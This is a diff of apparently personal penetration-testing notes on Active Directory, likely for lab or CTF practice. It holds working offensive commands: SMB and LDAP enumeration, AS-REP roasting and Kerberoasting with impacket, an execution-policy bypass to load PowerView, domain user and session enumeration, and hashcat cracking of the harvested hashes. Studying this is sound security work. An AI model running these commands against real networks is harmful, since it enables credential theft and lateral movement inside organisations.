@@ -1,5 +1,5 @@
-# Getting Initial Foodhold (We need Credentials!! User names are golden :) )
-1. Determine the IP address or hostname of the Active Directory server. If we seen( port 53 445, 389, 88, we are most likely dealing with AD)
+## Getting Initial Foodhold
+1. Determine the IP address or hostname of the Active Directory server. If we seen( port 53 445, 389, 88, we are most likely dealing with Domain Controller)
 2. Enumerate DNS
 3. Check open ports: Enumerate SMB: If port 445 is open, use tools like enum4linux, smbmap, smbclient crackmapexec to gather information about the SMB service, such as shared folders and users.
 4. Enumerate LDAP: If port 389 or 3268/3269 is open, use tools like ldapsearch, to gather information about the LDAP directory service, such as users, groups, and organizational units.
@@ -46,15 +46,25 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
 6. Crack the hash
 # After initial shell, credentials or some password (Enumeration)
-1. Things we want to know, domain admins, 
-2. Enumerate the initial target using powerview. Trasfer file to target.
+1. Things we want to know, domain admins, domain controller, domain policy
+2. Enumerate the initial target using powerview. Trasfer Powerview to target.
 3. https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
-4. Transfer Powerview via
 5. `powershell -ep bypass ` `. .\PowerView.ps1` 
-6. `Get-NetDomain` , (domain info) `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME>
-7. `Get-NetDomainController` (for DC info, DC IP)
+6. `Get-NetDomain` , (domain info)
+7.  For manual inspection `net user` (for local accounts) `net user /domain` (for all domain users) `net user <USERNAME> /domain` 
+8. `Get-NetUser` `Get-NetUser | select cn` 
+9. `Get-UserProperty -Properties pwdlastset` (are the passwords new?)   `Get-UserProperty -Properties logoncount` (logins with lot of login?)  
+10. `Get-NetGroup`  `Get-NetGroup -GroupName "Domain Admins`. To view the Members `Get-NetGroupMembers -GroupName "Domain Admins`
+11. `Get-NetDomainController` (for DC info, DC IP)
+12. `Get-DomainPolicy` `(Get-DomainPolicy)."system access"` (policy such as minimum password length)
+13. `Get-NetComputer` (show all the computers in the Domain) 
+14. `Invoke-ShareFinder` (what files are being shared)
+15. `Get-NetGPO` (show group policy)
+16.  `Get-NetLoggedon -ComputerName <current Computer name>  `(Find,Currently Logged on Users: their credentials will be saved in memory so find out logged in highvalue target or lateral movement)
+17.   `Get-NetSession -ComputerName dc01` (to verfify that domain controller is logged into what other pc)
+
 ## Kerbreroasting (Service account)
-1. Once we have creds, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
+1. Once we have some username + password, we ask the Domian Controller for TGS (since we can request TGT) and try to crack TGS hash.
 ```
 impacket-GetUserSPNs <IP or hostname>/<username>:<password> -request [add -request if SPN is found]
 [save hash and crack with hashcat]
